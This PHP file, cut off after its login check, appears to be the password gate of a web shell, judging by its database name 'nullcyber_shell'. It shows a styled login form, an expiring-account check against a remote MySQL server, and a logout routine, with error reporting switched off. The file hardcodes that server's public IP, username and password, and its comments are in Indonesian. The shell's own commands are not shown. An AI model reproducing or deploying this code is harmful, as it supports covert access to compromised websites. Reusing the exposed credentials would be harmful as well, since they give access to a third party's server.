<?php
session_start();
error_reporting(0);

function show_login_page() {
    echo '<div class="max-w-md mx-auto my-4 p-4 bg-gray-200 rounded-lg shadow-lg">';
    echo '<form method="post" action="">';
    echo '<div class="mb-4">';
    echo '<label for="username" class="block text-gray-700 font-bold">Username:</label>';
    echo '<input type="text" name="username" id="username" class="border rounded px-3 py-2 w-full" required>';
    echo '</div>';
    echo '<div class="mb-4">';
    echo '<label for="password" class="block text-gray-700 font-bold">Password:</label>';
    echo '<input type="password" name="password" id="password" class="border rounded px-3 py-2 w-full" required>';
    echo '</div>';
    echo '<input type="submit" value="Login" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded">';
    echo '</form>';
    echo '</div>';
}

// Fungsi untuk kredensial login
function check_login($username, $password) {
    $db_host = '154.53.61.106:3306';
    $db_user = 'nullcyber_seblak';
    $db_pass = '4l89K6c3cdRB';
    $db_name = 'nullcyber_shell';
    $table_name = 'users';//jangan ubah

    try {
        $dsn = "mysql:host=$db_host;dbname=$db_name";
        $pdo = new PDO($dsn, $db_user, $db_pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        // Buat fungsi hash
        $password_hash = hash('sha256', $password);

        $sql = "SELECT password_hash, expiry_time FROM $table_name WHERE username = :username";
        $stmt = $pdo->prepare($sql);
        $stmt->bindParam(':username', $username, PDO::PARAM_STR);
        $stmt->execute();

        if ($stmt->rowCount() == 1) {
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            $valid_password_hash = $row['password_hash'];
            $expiry_time = strtotime($row['expiry_time']);

            if (time() < $expiry_time && hash_equals($password_hash, $valid_password_hash)) {
                $_SESSION['username'] = $username;
                return true;
            } else {
                $delete_sql = "DELETE FROM $table_name WHERE username = :username";
                $stmt = $pdo->prepare($delete_sql);
                $stmt->bindParam(':username', $username, PDO::PARAM_STR);
                $stmt->execute();
            }
        } else {
            echo "Invalid username or password";
        }
    } catch (PDOException $e) {
        die("Connection failed: " . $e->getMessage());
    }

    return false;
}
//fungsi logout
function fungsi_logout() {
    $_SESSION = array(); // Mengosongkan variabel sesi
    setcookie(session_name(), '', time() - 3600, '/'); // Menghapus cookie sesi
    session_destroy(); // Menghancurkan sesi
    header('Location: ' . $_SERVER['REQUEST_URI']); // Redirect ke halaman ini
    exit();
}

if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["logout"])) {
        // Jika parameter GET "logout" ada, jalankan fungsi logout
        fungsi_logout();
    }
// Cek sudah login
if (isset($_SESSION['username'])) {
    ?>